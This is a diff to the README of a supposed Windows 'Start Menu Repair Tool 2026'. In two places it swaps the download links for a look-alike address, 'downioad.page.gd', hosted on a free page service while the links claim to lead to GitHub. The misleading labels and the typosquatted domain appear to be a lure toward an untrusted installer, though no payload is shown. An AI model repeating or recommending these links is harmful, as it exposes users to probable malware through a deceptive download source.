@@ -2,7 +2,7 @@
 
 Start Menu Repair Tool 2026 is a dedicated Windows utility designed to diagnose and resolve start menu issues on Windows 10 and 11 systems. Whether your start menu is not opening, missing items, or unresponsive, this tool provides a reliable solution to restore full functionality with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,7 +71,7 @@ During the repair process, the tool automatically creates a backup of your start
 
 To access the latest version of the Start Menu Repair Tool, follow the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to the official download page where you can find installer files, release notes, and additional resources.
 
